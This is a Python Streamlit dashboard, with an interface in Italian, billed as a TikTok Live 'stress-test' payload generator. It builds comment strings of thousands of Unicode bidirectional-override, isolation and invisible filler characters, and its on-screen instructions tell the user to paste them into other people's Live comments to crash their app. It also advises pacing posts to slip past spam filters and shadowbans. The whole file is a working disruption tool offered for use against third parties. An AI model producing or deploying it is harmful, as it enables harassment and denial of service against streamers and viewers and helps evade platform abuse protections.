import streamlit as st
import random
import datetime

# Configurazione della Dashboard Privata
st.set_page_config(page_title="TikTok Live Payload Generator", page_icon="⚡", layout="wide")

# Stile Dark Mode "Console"
st.markdown("""
    <style>
    .main { background-color: #0b0e14; color: #00d4ff; font-family: 'Consolas', monospace; }
    .stTextArea textarea { background-color: #161b22; color: #ff3e3e; border: 1px solid #30363d; font-family: 'Consolas'; }
    .stButton>button { background-color: #ff3e3e; color: white; border-radius: 5px; border: none; height: 3em; width: 100%; font-weight: bold; }
    .stButton>button:hover { background-color: #cc0000; border: 1px solid white; }
    header, footer {visibility: hidden;}
    </style>
    """, unsafe_allow_html=True)

st.title("⚡ TikTok Live Stress-Test Tool")
st.write(f"Operatore Autorizzato | Sessione: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}")
st.write("---")

# Funzione core per generare il payload di tilt
def generate_tilt_payload(intensity):
    # Caratteri che mandano in loop il motore di rendering (Bidi e Control)
    # Questi caratteri costringono il client TikTok a ricalcolare i vettori del testo continuamente
    chaos_chars = [
        "\u202a", "\u202b", "\u202c", "\u202d", "\u202e", # Directional overrides
        "\u2066", "\u2067", "\u2068", "\u2069",           # Isolation characters
        "\ufeff",                                         # Byte Order Mark
        "\u1160", "\u3164", "\uFFA0"                      # Invisible Hangul Fillers
    ]
    
    # Prefisso visibile per "camuffare" o intimidire
    prefix = "🚨 [SYSTEM_OVERLOAD_DETECTED] 🚨 "
    
    # Aumentiamo la densità in base all'intensità scelta
    length = 3000 if intensity == "Medium" else 6000
    
    payload = prefix
    for _ in range(length):
        payload += random.choice(chaos_chars)
    
    return payload

# Interfaccia di Controllo
col1, col2 = st.columns([1, 2])

with col1:
    st.subheader("Parametri Attacco")
    intensity = st.select_slider("Intensità Payload", options=["Medium", "Maximum"])
    st.info("Nota: L'intensità 'Maximum' ha più probabilità di crashare l'app, ma potrebbe essere bloccata dai filtri antispam di TikTok.")
    
    if st.button("GENERATE PAYLOAD"):
        st.session_state.payload = generate_tilt_payload(intensity)
        st.success("Payload Generato con Successo!")

with col2:
    st.subheader("Payload Output")
    if 'payload' in st.session_state:
        # Mostriamo il payload in un'area di testo per facilitare il copia-incolla
        st.text_area("Copia il contenuto qui sotto:", value=st.session_state.payload, height=400)
        st.caption("Istruzioni: Copia tutto il testo e incollalo nei commenti della Live. Il client del destinatario andrà in buffer overflow.")
    else:
        st.write("In attesa di generazione...")

st.write("---")
st.warning("ATTENZIONE: L'uso eccessivo può portare allo shadowban temporaneo dell'account che invia i messaggi. Usare intervalli di almeno 30 secondi tra un invio e l'altro.")
